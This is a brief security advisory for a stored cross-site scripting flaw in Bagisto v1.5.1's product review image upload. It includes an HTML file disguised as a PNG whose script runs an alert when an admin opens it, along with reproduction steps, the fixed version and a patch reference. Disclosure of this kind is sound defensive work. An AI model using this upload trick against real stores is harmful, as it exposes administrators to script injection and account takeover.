Bagisto v1.5.1 is vulnerable for Cross site scripting(XSS) via png file upload vulnerability in product review option.

Vulnerable URL: https://localhost/bagisto-common/api/product/<product_id>/review

Payload: Save this payload in png file : test.png

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Test Upload File</title>
</head>
<body>
<h1>Test upload</h1>
<script>alert(1)</script>
</body>
</html>


Affected Version: Bagisto v1.5.1

Fixed Version: Bagisto v2.1.0

Steps to Reproduce: 

Step 1: Login with any use account and review of any product.
Step 2: After Uploading above given png file in review section, click on submit review button.
Step 3: When admin will open this review image in new tab this payload will execute.


Reference: https://github.com/bagisto/bagisto/pull/9474 

